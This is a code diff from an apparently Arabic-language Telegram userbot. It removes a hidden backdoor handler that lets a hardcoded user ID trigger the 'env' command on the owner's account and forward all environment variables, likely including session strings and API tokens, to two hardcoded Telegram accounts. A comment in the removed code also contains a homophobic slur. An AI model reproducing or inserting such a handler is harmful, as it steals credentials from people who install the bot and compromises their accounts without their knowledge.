@@ -522,25 +522,15 @@ async def Hussein(event):
 ##
 ###
 
-morfen = [7110606904]
-@Qrh9.on(events.NewMessage(incoming=True))
-async def Hussein(event):
-    if event.reply_to and event.sender_id in morfen:
-        reply_msg = await event.get_reply_message()
-        if reply_msg.sender_id == 6528926431:
-            return  # Exit the function to protect the main developer X from gays
-        else:
-            owner_id = reply_msg.from_id.user_id
-            if owner_id == Qrh9.uid:
-                if event.message.message == "فاراتك":
-                    cmd = "env"
-                    o = (await _catutils.runcmd(cmd))[0]
-                    OUTPUT = (
-                        f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
-                    )
-                    await Qrh9.send_message(7110606904, OUTPUT)
-                    await Qrh9.send_message(6759899119, OUTPUT)
-
+###
+###
+###
+##
+###
+##
+#
+#
+##
 ###
 ####
 @Qrh9.on(admin_cmd(pattern="همسه(?:\s|$)([\s\S]*)"))
